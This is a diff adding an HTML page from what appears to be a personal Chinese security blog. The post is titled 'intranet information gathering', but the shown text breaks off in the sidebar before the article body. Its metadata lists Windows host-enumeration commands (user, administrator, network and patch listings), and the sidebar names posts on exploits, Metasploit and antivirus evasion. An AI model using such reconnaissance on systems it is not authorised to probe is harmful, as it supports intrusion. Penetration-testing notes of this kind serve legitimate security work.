@@ -1,0 +1,1194 @@
+<!doctype html><html lang=en dir=ltr>
+<head>
+<meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<title>内网信息收集 – ZDoc</title>
+<script defer src=/js/fuse.min.94c78ad70b02749822921660cf4e9f0b3701bc0680c421afb784a78228de0275.js></script>
+<script src=/js/enquire.min.dfb99dee1e029d51d6cfb672d847929890b1585402de17f5ed092edd72a688b4.js></script>
+<script defer src=/js/lazysizes.min.31dd6a2d3a1ec0f78a8df007535cf23f03aeb5c70f026e6d6a19dac3b3acc340.js></script>
+<script defer src=/js/helper/getParents.min.ccd45f158c1b17849307ba913a72beac239c410f2b6e648496a79842da84e55b.js></script>
+<script defer src=/js/helper/fadeinout.min.9fb19682560d5fa5596fffec85da605067c4acc86aad05add4d8fff9d362a446.js></script>
+<script>"use strict";window.onload=function(){var q=JSON.parse('"ltr"'),Y=JSON.parse('"http://crkmythical.github.io"'),af=JSON.parse('"http://crkmythical.github.io/blog/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"'),M=document.getElementById("toggle-sidebar"),P=document.getElementById("toggle-menu"),z=document.querySelector('.toc__body'),y=document.querySelector('.toc__label'),j=document.getElementById('list-main'),B=document.getElementById('list-side'),w=document.getElementById('single-menu'),l=document.querySelectorAll('.slider__icon'),S,G,ae,E,x,r,X,m,t,$,W,L,C,i,K,A,U,p,D,Z,h,H,I,J,o,k,n,N,O,ac,u,_,b,c,f,s,ad,v,g,T,e,ag,ah,a,aj,V;M?M.addEventListener('change',function(a){a.target.checked?(z&&fadeIn(z,200),y&&fadeIn(y,200),j&&B&&(j.className='m',B.className='r'),l&&l.forEach(function(a){a.classList.contains('hide')?a.classList.remove('hide'):a.classList.add('hide')})):(z&&fadeOut(z,200),y&&fadeOut(y,200),j&&B&&(j.className='mr',B.className='hide'),l&&l.forEach(function(a){a.classList.contains('hide')?a.classList.remove('hide'):a.classList.add('hide')}))}):null,P?P.addEventListener('change',function(a){a.target.checked?(j&&w&&(j.className='m',w.className='l'),l&&l.forEach(function(a){a.classList.contains('hide')?a.classList.remove('hide'):a.classList.add('hide')})):(j&&w&&(j.className='lm',w.className='hide'),l&&l.forEach(function(a){a.classList.contains('hide')?a.classList.remove('hide'):a.classList.add('hide')}))}):null,S=document.getElementById('navCollapseBtn'),S?S.addEventListener('click',function(c){var a=document.querySelector('.navbar__collapse'),b;a&&(b=a.getAttribute('data-open'),b==='true'?(a.setAttribute('data-open','false'),a.style.maxHeight=0):(a.setAttribute('data-open','true'),a.style.maxHeight=a.scrollHeight+"px"))}):null,G=document.querySelectorAll('.expand__button');for(let a=0;a<G.length;a++)G[a].addEventListener("click",function(){var a=this.nextElementSibling;a.style.maxHeight?(a.style.maxHeight=null,this.querySelector('svg').classList.add('expand-icon__right'),this.querySelector('svg').classList.remove('expand-icon__down')):(a.style.maxHeight=a.scrollHeight+"px",this.querySelector('svg').classList.remove('expand-icon__right'),this.querySelector('svg').classList.add('expand-icon__down'))});document.querySelectorAll('.tab')?document.querySelectorAll('.tab').forEach(function(a,d){var e=a.getAttribute('id'),f=a,b=a.querySelectorAll('.tab__link'),c=a.querySelectorAll('.tab__content'),g=[];b&&b.length>0?b.forEach(function(b,d,a){b.onclick=function(e){for(var b=0;b<a.length;b++)d===parseInt(b,10)?a[b].classList.contains('active')||(a[b].classList.add('active'),c[b].style.display='block'):(a[b].classList.remove('active'),c[b].style.display='none')}}):null}):null,document.querySelectorAll('.codetab')?document.querySelectorAll('.codetab').forEach(function(a,d){var e=a.getAttribute('id'),f=a,b=a.querySelectorAll('.codetab__link'),c=a.querySelectorAll('.codetab__content'),g=[];b&&b.length>0?b.forEach(function(b,d,a){b.onclick=function(e){for(var b=0;b<a.length;b++)d===parseInt(b,10)?a[b].classList.contains('active')||(a[b].classList.add('active'),c[b].style.display='block'):(a[b].classList.remove('active'),c[b].style.display='none')}}):null}):null,ae=JSON.parse("true"),E=document.getElementById('root'),x=document.getElementById('toggleToLight'),r=document.getElementById('toggleToDark'),ae||(E.className='theme__light',localStorage.setItem('theme','light')),r&&(r.onclick=function(a){E.className='theme__dark',localStorage.setItem('theme','dark'),x.className='navbar__icons--icon',r.className='hide'}),x&&(x.onclick=function(a){E.className='theme__light',localStorage.setItem('theme','light'),x.className='hide',r.className='navbar__icons--icon'}),document.querySelectorAll('.menu__list').forEach(function(a){a.classList.contains('active')&&(a.style.maxHeight=a.scrollHeight+"px")}),document.querySelectorAll('.menu__title--collapse').forEach(function(a){a.addEventListener('click',function(e){var b=this.nextElementSibling,c=this.querySelector('.menu__title--icon'),d;if(!b)return null;for(d=a.parentNode;d.classList.contains('menu__list')&&d.classList.contains('active');)d.style.maxHeight=100*d.children.length+"px",d=d.parentNode;b.style.maxHeight?(b.style.maxHeight=null,b.classList.remove('active'),c.classList.add('right'),q==='rtl'?c.classList.remove('downrtl'):c.classList.remove('down')):(b.style.maxHeight=b.scrollHeight+"px",b.classList.add('active'),c.classList.remove('right'),q==='rtl'?c.classList.add('downrtl'):c.classList.add('down'))})}),X=document.getElementById('mobileLogo'),m=document.getElementById("myModal"),t=document.getElementById('myDrawer'),$=document.querySelector('.drawer__close'),W=function(){m.style.opacity=1,q==='rtl'?(m.style.right=0,t.style.right=0):(m.style.left=0,t.style.left=0)},L=function(){m.style.opacity=0,q==='rtl'?t.style.right='-100%':t.style.left='-100%',setTimeout(function(){q==='rtl'?m.style.right='-100%':m.style.left='-100%'},250)},X.onclick=function(){W(),localStorage.setItem('isDrawerOpen','true')},m.onclick=function(){L(),localStorage.setItem('isDrawerOpen','false')},$.onclick=function(){L(),localStorage.setItem('isDrawerOpen','false')},C=window.pageYOffset||document.documentElement.scrollTop,i=document.querySelector('.toc'),K=i?i.querySelector('#TableOfContents'):null,A=document.querySelector('.single__contents'),U=document.querySelectorAll('div[data-bgimg]'),p=JSON.parse('["h2","h3","h4"]'),p?p=p.toString():p="h1, h2, h3, h4, h5, h6",D=JSON.parse("null"),Z=JSON.parse("false");function F(a){Z&&D&&Object.keys(D).length&&(D.height<=a?U.forEach(function(a){a.setAttribute('data-bgimg','false')}):U.forEach(function(a){a.setAttribute('data-bgimg','true')}))}F(C),window.onscroll=function(){var a=window.pageYOffset||document.documentElement.scrollTop;a>C?(A?A.querySelectorAll(p.toString()).forEach(function(a){if(document.documentElement.scrollTop>=a.offsetTop)if(K){var b=a.getAttribute('id');i.querySelectorAll('a').forEach(function(a){a.classList.remove('active')}),i.querySelector('a[href="#'+b+'"]')?i.querySelector('a[href="#'+b+'"]').classList.add('active'):null}}):null,F(a)):(A?A.querySelectorAll(p.toString()).forEach(function(a){if(document.documentElement.scrollTop>=a.offsetTop)if(K){var b=a.getAttribute('id');i.querySelectorAll('a').forEach(function(a){a.classList.remove('active')}),i.querySelector('a[href="#'+b+'"]')?i.querySelector('a[href="#'+b+'"]').classList.add('active'):null}}):null,F(a)),C=a<=0?0:a},h=document.querySelector('#search-mobile'),H=document.querySelector('.mobile-search'),I=document.querySelector('#mobileSearchBtn'),J=document.querySelector('#search-mobile-close'),o=document.querySelector('#search-mobile-container'),k=document.querySelector('#search-mobile-results'),n=document.querySelector('html'),H&&(H.style.display='none'),I?I.addEventListener('click',function(){o&&(o.style.display='block'),h&&h.focus(),n&&(n.style.overflowY='hidden')}):null,J?J.addEventListener('click',function(){if(o&&(o.style.display='none'),h&&(h.value=''),k)while(k.firstChild)k.removeChild(k.firstChild);n&&(n.style.overflowY='visible')}):null,h?h.addEventListener('keydown',function(a){if(a.key==='Escape'){if(o&&(o.style.display='none'),h&&(h.value=''),k)while(k.firstChild)k.removeChild(k.firstChild);n&&(n.style.overflowY='visible')}}):null,N=localStorage.getItem('theme'),O=document.getElementById('root'),ac=document.querySelectorAll('.select-theme'),u=document.querySelectorAll('.select-theme__item'),N&&(u?u.forEach(function(a){a.text.trim()===N?a.classList.add('is-active'):a.classList.remove('is-active')}):null),u?u.forEach(function(a,b){a.addEventListener('click',function(c){var a=c.target.text.trim(),b;localStorage.setItem('theme',a),O.removeAttribute('class'),O.classList.add(`theme__${a}`),ac.forEach(function(b){b.querySelectorAll('a').forEach(function(b){b.classList&&(b.text.trim()===a?b.classList.contains('is-active')||b.classList.add('is-active'):b.classList.contains('is-active')&&b.classList.remove('is-active'))})}),window.mermaid&&(a==="dark"||a==="hacker"?(mermaid.initialize({theme:'dark'}),location.reload()):(mermaid.initialize({theme:'default'}),location.reload())),b=document.querySelector('iframe'),b&&b.contentWindow.postMessage({type:'set-theme',theme:a==="dark"||a==="hacker"?'photon-dark':a==='kimbie'?'github-dark-orange':'github-light'},'https://utteranc.es')})}):null,_=JSON.parse('""'),b=null,c=null,f=null,s=JSON.parse("true"),ad=JSON.parse("true"),v=null,ad&&function(){var a=new XMLHttpRequest;a.open('GET',Y+_+"/index.json"),a.setRequestHeader('Content-Type','application/json; charset=utf-8'),a.onload=function(){a.status===200?v=new Fuse(JSON.parse(a.response.toString('utf-8')),{keys:['title','description','content'],includeMatches:s,shouldSort:!0,threshold:.4,location:0,distance:100,maxPatternLength:32,minMatchCharLength:1}):console.error(`[${a.status}]Error:`,a.statusText)},a.send()}();function ai(e,a){var b=document.createElement('li'),c,d;b.className='search-result__item',c=document.createElement('a'),c.innerHTML=a.title,c.setAttribute('class','search-result__item--title'),c.setAttribute('href',a.permalink),d=document.createElement('div'),d.setAttribute('class','search-result__item--desc'),a.description?d.innerHTML=a.description:a.content&&(d.innerHTML=a.content.substring(0,80)),b.appendChild(c),b.appendChild(d),e.appendChild(b)}function ak(g,a){var f=document.createElement('li'),b,e,c;if(f.className='search-result__item',b=null,e=document.createElement('a'),e.innerHTML=a.item.title,e.setAttribute('class','search-result__item--title'),e.setAttribute('href',a.item.uri),a.matches&&a.matches.length){for(c=0;c<a.matches.length;c++)'title'===a.matches[c].key&&(e=document.createElement('a'),e.innerHTML=d(a.matches[c].value,a.matches[c].indices),e.setAttribute('class','search-result__item--title'),e.setAttribute('href',a.item.uri)),'description'===a.matches[c].key?(b=document.createElement('div'),b.setAttribute('class','search-result__item--desc'),b.innerHTML=d(a.item.description,a.matches[c].indices)):'content'===a.matches[c].key?b||(b=document.createElement('div'),b.setAttribute('class','search-result__item--desc'),b.innerHTML=d(a.item.content.substring(0,80),a.matches[c].indices)):a.item.description?(b=document.createElement('div'),b.setAttribute('class','search-result__item--desc'),b.innerHTML=a.item.description):(b=document.createElement('div'),b.setAttribute('class','search-result__item--desc'),b.innerHTML=a.item.content.substring(0,80));f.appendChild(e),b&&f.appendChild(b),f&&g.appendChild(f)}}function R(f,e){var a,d;for(b=document.getElementById('search-results'),c=document.getElementById('search-menu'),b.setAttribute('class','dd is-active'),a=document.createElement('ul'),a.setAttribute('class','dd-content search-content'),e.length?e.forEach(function(b){var e=document.createElement('li'),c=document.createElement('a'),f,d;c.setAttribute('href',b.uri),c.setAttribute('class','dd-item'),c.appendChild(e),f=document.createElement('div'),f.innerHTML=b.title,f.setAttribute('class','search-result__item--title'),d=document.createElement('div'),d.setAttribute('class','search-result__item--desc'),b.description?d.innerHTML=b.description:b.content&&(d.innerHTML=b.content.substring(0,80)),e.appendChild(f),e.appendChild(d),a.appendChild(c)}):(d=document.createElement('li'),d.setAttribute('class','dd-item'),d.innerText='No results found',a.appendChild(d));c.hasChildNodes();)c.removeChild(c.lastChild);c.appendChild(a)}function Q(g,f){var a,e;for(b=document.getElementById('search-results'),c=document.getElementById('search-menu'),b.setAttribute('class','dd is-active'),a=document.createElement('ul'),a.setAttribute('class','dd-content search-content'),f.length?f.forEach(function(b){var h=document.createElement('li'),f=document.createElement('a'),c=null,g,e;if(f.setAttribute('href',b.item.uri),f.setAttribute('class','dd-item'),f.appendChild(h),g=document.createElement('div'),g.innerHTML=b.item.title,g.setAttribute('class','search-result__item--title'),b.matches&&b.matches.length){for(e=0;e<b.matches.length;e++)'title'===b.matches[e].key&&(g.innerHTML=d(b.matches[e].value,b.matches[e].indices)),'description'===b.matches[e].key?(c=document.createElement('div'),c.setAttribute('class','search-result__item--desc'),c.innerHTML=d(b.item.description,b.matches[e].indices)):'content'===b.matches[e].key?c||(c=document.createElement('div'),c.setAttribute('class','search-result__item--desc'),c.innerHTML=d(b.item.content.substring(0,80),b.matches[e].indices)):b.item.description?(c=document.createElement('div'),c.setAttribute('class','search-result__item--desc'),c.innerHTML=b.item.description):(c=document.createElement('div'),c.setAttribute('class','search-result__item--desc'),c.innerHTML=b.item.content.substring(0,80));h.appendChild(g),c&&h.appendChild(c),a.appendChild(f)}}):(e=document.createElement('li'),e.setAttribute('class','dd-item'),e.innerText='No results found',a.appendChild(e));c.hasChildNodes();)c.removeChild(c.lastChild);c.appendChild(a)}function aa(f,d){var a,e;b=document.getElementById('search-mobile-results'),a=document.createElement('div'),a.setAttribute('class','mobile-search__content'),d.length>0?d.forEach(function(b){var c=document.createElement('a');c.setAttribute('href',b.uri),c.innerHTML='<div class="mobile-search__item"><div class="mobile-search__item--title">📄 '+b.title+'</div><div class="mobile-search__item--desc">'+(b.description?b.description:b.content)+'</div></div>',a.appendChild(c)}):(e=document.createElement('span'),a.appendChild(e));let c=document.getElementById('search-mobile-results');while(c.firstChild)c.removeChild(c.firstChild);b.appendChild(a)}function ab(g,e){var a,f;b=document.getElementById('search-mobile-results'),a=document.createElement('div'),a.setAttribute('class','mobile-search__content'),e.length?e.forEach(function(b){var f=document.createElement('li'),h=document.createElement('a'),c=null,g,e;if(h.setAttribute('href',b.item.uri),h.appendChild(f),f.setAttribute('class','mobile-search__item'),g=document.createElement('div'),g.innerHTML=b.item.title,g.setAttribute('class','mobile-search__item--title'),b.matches&&b.matches.length){for(e=0;e<b.matches.length;e++)'title'===b.matches[e].key&&(g.innerHTML=d(b.matches[e].value,b.matches[e].indices)),'description'===b.matches[e].key?(c=document.createElement('div'),c.setAttribute('class','mobile-search__item--desc'),c.innerHTML=d(b.item.description,b.matches[e].indices)):'content'===b.matches[e].key?c||(c=document.createElement('div'),c.setAttribute('class','mobile-search__item--desc'),c.innerHTML=d(b.item.content.substring(0,150),b.matches[e].indices)):b.item.description?(c=document.createElement('div'),c.setAttribute('class','mobile-search__item--desc'),c.innerHTML=b.item.description):(c=document.createElement('div'),c.setAttribute('class','mobile-search__item--desc'),c.innerHTML=b.item.content.substring(0,150));f.appendChild(g),c&&f.appendChild(c),a.appendChild(h)}}):(f=document.createElement('span'),a.appendChild(f));let c=document.getElementById('search-mobile-results');while(c.firstChild)c.removeChild(c.firstChild);b.appendChild(a)}function d(a,d){if(!d)return a;var b='',c=0;return d.forEach(function(d){if(d[0]===d[1])return null;b+=''+a.substring(c,d[0])+'<span class="search__highlight">'+a.substring(d[0],d[1]+1)+'</span>'+'',c=d[1]+1}),b+=a.substring(c),b}g=document.getElementById('search'),T=document.getElementById('search-mobile'),e=document.getElementById('search-results'),g?g.addEventListener('input',function(a){var b,c;if(!a.target.value|window.innerWidth<770)return e?e.setAttribute('class','dd'):null,null;f=a.target.value,b=v.search(a.target.value),s?Q(f,b):R(f,b),c=e.querySelectorAll('.dd-item'),c?c.forEach(function(a){a.addEventListener('mousedown',function(a){a.target.click()})}):null}):null,g?g.addEventListener('blur',function(){if(window.innerWidth<770)return null;e?e.setAttribute('class','dd'):null}):null,g?g.addEventListener('click',function(a){var b,c;if(window.innerWidth<770)return null;if(!a.target.value)return e?e.setAttribute('class','dd'):null,null;f=a.target.value,b=v.search(a.target.value),s?Q(f,b):R(f,b),c=e.querySelectorAll('.dd-item'),c?c.forEach(function(a){a.addEventListener('mousedown',function(a){a.target.click()})}):null}):null,ag=document.getElementById("search-menu"),ah=document.querySelector('#search-menu .dd-item.is-active'),a=null,aj=null,V=350,g?g.addEventListener('keydown',function(d){var c,e;if(window.innerWidth<770)return null;if(c=document.querySelectorAll('#search-menu .dd-item'),d.key==='ArrowDown'){a===null?(a=0,c[a].classList.remove('is-active')):(c[a].classList.remove('is-active'),a=a===c.length-1?0:a+1),c[a].classList.add('is-active');let b=c[a].offsetTop+c[a].clientHeight-V;b>0?document.querySelector(".search-content").scrollTop+=c[a].getBoundingClientRect().height:a===0&&(document.querySelector(".search-content").scrollTop=0)}else if(d.key==='ArrowUp'){a===null?(a=c.length-1,c[a].classList.remove('is-active')):(c[a].classList.remove('is-active'),a=a===0?c.length-1:a-1),c[a].classList.add('is-active');let b=c[a].offsetTop+c[a].clientHeight-V;b<0?document.querySelector(".search-content").scrollTop-=c[a].getBoundingClientRect().height:document.querySelector(".search-content").scrollTop=b+c[a].getBoundingClientRect().height}else d.key==='Enter'?(e=c[a].getAttribute('href'),e&&(location.href=e)):d.key==='Escape'&&(d.target.value=null,b&&b.classList.remove('is-active'))}):null,T?T.addEventListener('input',function(a){var b,c;if(!a.target.value){let a=document.getElementById('search-mobile-results');while(a.firstChild)a.removeChild(a.firstChild);return null}f=a.target.value,b=v.search(a.target.value),s?ab(f,b):aa(f,b),c=e.querySelectorAll('.dd-item'),c?c.forEach(function(a){a.addEventListener('mousedown',function(a){a.target.click()})}):null}):null}</script>
+<link rel=stylesheet href=/css/main.min.css>
+<meta name=description content>
+<meta name=keywords content>
+<meta name=created content="2020-12-07T18:52:47+0000">
+<meta name=modified content="2020-12-07T18:52:47+0000">
+<meta property="og:site_name" content="ZDoc">
+<meta property="og:title" content="内网信息收集">
+<meta property="og:url" content="http://crkmythical.github.io/blog/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
+<meta property="og:type" content="article">
+<meta name=generator content="Hugo 0.91.2">
+<meta name=msapplication-TileColor content="#ffffff">
+<meta name=theme-color content="#ffffff">
+<link rel=canonical href=http://crkmythical.github.io/blog/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/>
+<link rel=manifest href=/manifest.json>
+<link rel=apple-touch-icon sizes=57x57 href=/favicon/apple-icon-57x57.png>
+<link rel=apple-touch-icon sizes=60x60 href=/favicon/apple-icon-60x60.png>
+<link rel=apple-touch-icon sizes=72x72 href=/favicon/apple-icon-72x72.png>
+<link rel=apple-touch-icon sizes=76x76 href=/favicon/apple-icon-76x76.png>
+<link rel=apple-touch-icon sizes=114x114 href=/favicon/apple-icon-114x114.png>
+<link rel=apple-touch-icon sizes=120x120 href=/favicon/apple-icon-120x120.png>
+<link rel=apple-touch-icon sizes=144x144 href=/favicon/apple-icon-144x144.png>
+<link rel=apple-touch-icon sizes=152x152 href=/favicon/apple-icon-152x152.png>
+<link rel=apple-touch-icon sizes=180x180 href=/favicon/apple-icon-180x180.png>
+<link rel=icon type=image/png sizes=192x192 href=/favicon/android-icon-192x192.png>
+<link rel=icon type=image/png sizes=192x192 href=/favicon/android-icon-512x512.png>
+<link rel=icon type=image/png sizes=32x32 href=/favicon/favicon-32x32.png>
+<link rel=icon type=image/png sizes=96x96 href=/favicon/favicon-96x96.png>
+<link rel=icon type=image/png sizes=16x16 href=/favicon/favicon-16x16.png>
+<meta name=msapplication-TileColor content="#ffffff">
+<meta name=msapplication-TileImage content="/ms-icon-144x144.png">
+<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"内网信息收集","datePublished":"2020-12-07T18:52:47Z","dateModified":"2020-12-07T18:52:47Z","url":"http://crkmythical.github.io/blog/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","description":"1.1. 本机信息 1.1.1. 手动收集 1.1.1.1. 用户列表/管理员 net user | net localgroup administrators 当前在线用户 query user 1.1.1.2. 网络配置 ipconfig /all 1.1.1.3. 操作系统及补丁 wmic qfe list …","mainEntityOfPage":{"@type":"WebPage","@id":"http://crkmythical.github.io"},"publisher":{"@type":"Organization","name":"ZDoc","url":"http://crkmythical.github.io"}}</script>
+</head>
+<body id=root class=theme__light>
+<script>var rootElem=document.getElementById('root'),themeOptions=JSON.parse('["light","dark"]'),localTheme=localStorage.getItem('theme');localTheme&&themeOptions&&themeOptions.length>0&&(themeOptions.includes(localTheme)?rootElem.className=`theme__${localTheme}`:rootElem.className=`theme__${themeOptions[0]}`)</script>
+<div id=container>
+<div id=myDrawer class=drawer>
+<div class=drawer__header>
+<a href=/ class=drawer__header--text>
+Mr.Frame
+</a>
+<div class=grow></div>
+<div class=drawer__close><svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path fill="currentcolor" d="M18.3 5.71c-.39-.39-1.02-.39-1.41.0L12 10.59 7.11 5.7c-.39-.39-1.02-.39-1.41.0s-.39 1.02.0 1.41L10.59 12 5.7 16.89c-.39.39-.39 1.02.0 1.41s1.02.39 1.41.0L12 13.41l4.89 4.89c.39.39 1.02.39 1.41.0s.39-1.02.0-1.41L13.41 12l4.89-4.89c.38-.38.38-1.02.0-1.4z"/></svg>
+</div>
+</div>
+<div class=drawer__body>
+<div class=menu>
+<h6 class=menu__label>
+内网信息收集
+</h6>
+<ul>
+<li>
+<a href=http://crkmythical.github.io/blog/halo/ class=menu__title>Halo</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/atlassian-confluence-md/ class=menu__title>Atlassian_Confluence-CVE-2022-26134.md</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/%E8%81%8C%E5%9C%BA%E5%AD%A6%E4%B9%A0%E5%8A%9B%E7%9A%84%E8%AF%BB%E5%90%8E%E6%84%9F/ class=menu__title>职场学习力的读后感</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/%E5%85%B3%E4%BA%8E%E7%9F%A5%E8%AF%86/ class=menu__title>关于知识</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/%E5%A6%82%E4%BD%95%E9%AB%98%E6%95%88%E5%AD%A6%E4%B9%A0/ class=menu__title>如何高效学习</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/%E8%AE%A4%E7%9F%A5%E5%A4%A9%E6%80%A7%E4%B8%AD%E5%85%B3%E4%BA%8E%E5%AD%A6%E4%B9%A0%E6%96%B9%E6%B3%95%E7%9A%84%E8%A7%81%E8%A7%A3/ class=menu__title>《认知天性》中关于学习方法的见解</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/fail2ban/ class=menu__title>Fail2ban</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/%E5%AF%86%E7%A0%81%E7%AE%A1%E7%90%86%E6%96%B9%E6%A1%88%E7%9A%84%E7%A0%94%E7%A9%B6%E5%92%8C%E6%90%AD%E5%BB%BA/ class=menu__title>密码管理方案的研究和搭建</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/%E5%85%B3%E4%BA%8E%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/ class=menu__title>关于域信息收集</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/%E5%85%B3%E4%BA%8Eweb%E7%9B%AE%E6%A0%87%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/ class=menu__title>关于web目标的信息收集</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/xray%E9%85%8D%E7%BD%AE%E5%8F%8D%E8%BF%9E%E5%B9%B3%E5%8F%B0/ class=menu__title>xray配置反连平台</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/%E5%85%B3%E4%BA%8E%E5%8C%BA%E5%9D%97%E9%93%BE%E7%9A%84%E8%AE%A4%E7%9F%A5/ class=menu__title>关于区块链的认知</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/android%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/ class=menu__title>Android软件测试基础</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/%E5%A6%82%E4%BD%95%E5%B0%86%E8%A7%86%E9%A2%91%E8%BD%AC%E5%8C%96%E4%B8%BAgif/ class=menu__title>如何将视频转化为Gif</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/ class=menu__title>PHP代码审计</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/mac%E4%B8%8B%E6%90%AD%E5%BB%BAnginx-php%E5%BC%80%E5%8F%91%E5%B9%B3%E5%8F%B0/ class=menu__title>Mac下搭建Nginx+php开发平台</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/gnupg%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/ class=menu__title>GnuPG使用教程</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/%E5%9C%A8linux%E4%BD%BF%E7%94%A8apache2%E6%90%AD%E5%BB%BAwebdav%E6%9C%8D%E5%8A%A1/ class=menu__title>在Linux使用apache2搭建webdav服务</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/app%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/ class=menu__title>App渗透测试</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/%E5%A6%82%E4%BD%95%E5%9C%A8aws%E4%B8%8A%E9%83%A8%E7%BD%B2kali/ class=menu__title>如何在AWS上部署kali</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/idea%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/ class=menu__title>IDEA使用教程</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/%E5%88%A9%E7%94%A8msf%E6%A1%86%E6%9E%B6%E5%AF%B9%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E8%BF%9B%E8%A1%8C%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/ class=menu__title>利用msf框架对安卓手机进行简单操作</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/linux%E4%B8%8A%E5%A4%9A%E7%89%88%E6%9C%ACjdk%E8%AF%A5%E5%A6%82%E4%BD%95%E7%AE%A1%E7%90%86/ class=menu__title>linux上多版本JDK该如何管理</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/android%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%BD%AF%E4%BB%B6-mac%E5%B9%B3%E5%8F%B0/ class=menu__title>Android软件安全测试软件_mac平台</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/%E5%9F%BA%E4%BA%8Edocker%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA-%E4%B8%BB%E6%9C%BA%E7%AF%87/ class=menu__title>基于docker的网络安全靶场搭建-主机篇</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/macos%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/ class=menu__title>macOS使用记录</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/%E5%85%8D%E6%9D%80%E4%B8%93%E9%A2%98%E6%80%9D%E8%80%83/ class=menu__title>免杀专题思考</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/%E7%BB%95%E8%BF%87cdn%E6%9F%A5%E6%89%BEip/ class=menu__title>绕过CDN查找IP</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/%E7%BD%91%E7%AB%99%E6%9E%B6%E6%9E%84/ class=menu__title>网站架构</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/win%E9%98%B2%E9%94%81%E5%B1%8F%E5%B0%8F%E8%84%9A%E6%9C%AC/ class=menu__title>win防锁屏小脚本</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/%E9%9A%90%E8%97%8F%E8%B4%A6%E6%88%B7%E6%8E%92%E6%9F%A5/ class=menu__title>隐藏账户排查</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/%E6%BC%8F%E6%89%ABawvs-nessus%E6%90%AD%E5%BB%BA-docker%E7%89%88/ class=menu__title>漏扫AWVS-Nessus搭建-docker版</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/ad%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/ class=menu__title>AD域环境搭建</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/%E5%85%B3%E4%BA%8E%E5%90%8C%E6%AD%A5%E7%9B%98%E7%9A%84%E4%B8%80%E4%BA%9B%E6%96%B9%E6%A1%88/ class=menu__title>关于同步盘的一些方案</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/linux%E5%A6%82%E4%BD%95%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89%E6%9C%8D%E5%8A%A1/ class=menu__title>linux如何添加自定义服务</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/%E6%BA%90%E7%A0%81%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9Fcode6%E6%90%AD%E5%BB%BA/ class=menu__title>源码监控系统code6搭建</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8ssh-session%E4%BC%9A%E8%AF%9D%E5%AE%9E%E7%8E%B0%E5%85%8D%E5%AF%86%E5%85%8Dkey%E7%99%BB%E5%BD%95jumpserver%E5%8F%8A%E5%88%A9%E7%94%A8/ class=menu__title>如何利用ssh-session会话实现免密免key登录jumpserver及利用</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/confluence-cve2021-26084/ class=menu__title>Confluence-CVE2021-26084</a>
+</li>
+<li>
+<a href=http://crkmythical.github.io/blog/awschatbot-slack%E9%9B%86%E6%88%90/ class=menu__title>awschatbot_slack集成</a>
